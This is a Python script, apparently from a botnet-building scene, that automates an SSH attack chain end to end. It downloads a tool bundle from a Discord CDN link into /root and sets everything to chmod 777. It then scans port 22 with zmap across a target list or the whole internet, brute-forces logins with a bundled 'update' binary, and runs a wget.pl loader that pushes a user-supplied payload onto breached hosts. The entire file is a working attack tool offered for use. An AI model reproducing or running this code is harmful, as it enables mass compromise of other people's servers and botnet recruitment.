#!/usr/bin/python																																																																																																#cc8d853da9dc58585041e7316d12c1e9

#   charge./switch's auto scanner
#   for the kiddos
#   contact: charge.#6666
#   website: theswitcharchive.com
#   IG: @switchnets

#import some hacks
import subprocess, time, sys

def run(cmd):
   subprocess.call(cmd, shell=True) # subprocess call so we can run hacker commands in the vps 
run('clear') # clear the screen :hahayes:

menu = raw_input("""

               ___         __       _____                                 
              /   | __  __/ /_____ / ___/_________ _____  ____  ___  _____ 
             / /| |/ / / / __/ __ \\\__ \\/ ___/ __ `/ __ \\/ __ \\/ _ \\/ ___/
            / ___ / /_/ / /_/ /_/ /__/ / /__/ /_/ / / / / / / /  __/ /    
           /_/  |_\\__,_/\\__/\\____/____/\\___/\\__,_/_/ /_/_/ /_/\\___/_/     
                                                               
	Welcome to charge./switch's Auto Scan Tool.

	1) Start Auto Scanning
	2) Information

	Please select an option: """)

if menu == "1":
	run('clear')
	autoscan = raw_input("""

		Welcome to the AutoScanner

		1) Start AutoScanning + Bruting + Loading

		Please press 1: """)

run('clear')
if autoscan == "1":
	print("")
	listsworld = raw_input("""
	    YOU WANNA SCAN SOME LISTS OR SCAN THE WORLD?

	    1) LISTS
	    2) WORLD

	    Please select an option: """)

run('clear')
if listsworld == "1":
	print("")
	listname = raw_input("""

		Example listname = private.lst

		Before the script starts, what is the name of your list? (With the .lst): """)
	print("\nThankyou.")
	time.sleep(1)
	run('clear')
	print("loading the hacks...")
	time.sleep(1)
	print("running AutoScanner in 5 seconds")
	for i in xrange(5,0,-1):
		sys.stdout.write(str(i)+' ') # countdown code
		sys.stdout.flush()
		time.sleep(1) # sleep so we dont kill ourselves :hahayes:
	print("\ndownloading files")
	run('cd; wget https://cdn.discordapp.com/attachments/586514958548860958/586536122423967745/scanning.zip')
	print("files downloaded")
	time.sleep(1)
	print("unzipping..")
	run('yum install unzip -y')
	run('unzip scanning.zip')
	run('mv scanning/* /root')
	run('rm -rf scanning')
	print("done!")
	time.sleep(1)
	print("chmodding...")
	run('chmod 777 *')
	print("getting ready...")
	time.sleep(3)
	alreadyinstalled = raw_input("Have you already installed ZMap? (y/n): ")
	if alreadyinstalled == "y":
		zmapinstalledisnetssh2 = raw_input("Have you already installed and Fixed the NetSSH2 Error? (y/n): ")
	if alreadyinstalled == "n":
		zmap = raw_input("""

			Running AutoInstaller Now, this will take a while. Be patient

			Also, NetSSH2 will be installed to fix any errors, this means that the install
			will probably ask you to press enter A LOT of times, whenever you see \x1b[37m[\x1b[32myes\x1b[37m] 
			or [autodetect] simply press enter.

			Press enter when you are ready: """)
		print("")
		print("\x1b[32mLETS GET THIS BREAD GAMERS.\x1b[37m")
		time.sleep(1)
		run('sh zmapinstall.sh')
		print("\ninstalled")
		time.sleep(1)
		print("running AutoScanner")
		time.sleep(3)
		print("AutoScanning Now.")
		run('zmap -p22 -w ' + listname + ' -o mfu.txt -B100M')
		print("\nAutoScanning finished, running bruter.")
		time.sleep(1)
		run('chmod 777 update')
		time.sleep(1)
		print("Running bruter now. (CTRL C when you think it has Frozen/Finished)")
		run('./update 1500')
		print("\n Bruting finished ")
		time.sleep(1)
		wget = raw_input("""

			Make sure your payload is in the wget.pl file, if it isnt, do this now
			Press enter when you are ready: """)

		time.sleep(1)
		print("\nRunning Loader...")
		time.sleep(1)
		run('perl wget.pl vuln.txt')
		print("Loading Finished")
		time.sleep(1)
		print("AutoScan Finished, exiting...")
		exit()
	if zmapinstalledisnetssh2 == "y":
		print("great, AutoScanner starting.")
		time.sleep(1)
		print("AutoScanning Now.")
		run('zmap -p22 -w ' + listname + ' -o mfu.txt -B100M')
		print("\nAutoScanning finished, running bruter.")
		time.sleep(1)
		run('chmod 777 update')
		time.sleep(1)
		print("Running bruter now. (CTRL C when you think it has Frozen/Finished)")
		run('./update 1500')
		print("\n Bruting finished ")
		time.sleep(1)
		wget = raw_input("""

			Make sure your payload is in the wget.pl file, if it isnt, do this now
			Press enter when you are ready: """)

		time.sleep(1)
		print("\nRunning Loader...")
		time.sleep(1)
		run('perl wget.pl vuln.txt')
		print("Loading Finished")
		time.sleep(1)
		print("AutoScan Finished, exiting...")
		exit()
	if zmapinstalledisnetssh2 == "n":
		time.sleep(1)
		zmap = raw_input("""

			Running AutoInstaller Now, this will take a while. Be patient

			Also, NetSSH2 will be installed to fix any errors, this means that the install
			will probably ask you to press enter A LOT of times, whenever you see \x1b[37m[\x1b[32myes\x1b[37m] 
			or [autodetect] simply press enter.

			Press enter when you are ready: """)
		print("")
		print("\x1b[32mLETS GET THIS BREAD GAMERS.\x1b[37m")
		time.sleep(1)
		run('sh zmapinstall.sh')
		print("\ninstalled")
		time.sleep(1)
		print("running AutoScanner")
		time.sleep(3)
		print("AutoScanning Now.")
		run('zmap -p22 -w ' + listname + ' -o mfu.txt -B100M')
		print("\nAutoScanning finished, running bruter.")
		time.sleep(1)
		run('chmod 777 update')
		time.sleep(1)
		print("Running bruter now. (CTRL C when you think it has Frozen/Finished)")
		run('./update 1500')
		print("\n Bruting finished ")
		time.sleep(1)
		wget = raw_input("""

			Make sure your payload is in the wget.pl file, if it isnt, do this now
			Press enter when you are ready: """)

		time.sleep(1)
		print("\nRunning Loader...")
		time.sleep(1)
		run('perl wget.pl vuln.txt')
		print("Loading Finished")
		time.sleep(1)
		print("AutoScan Finished, exiting...")
		exit()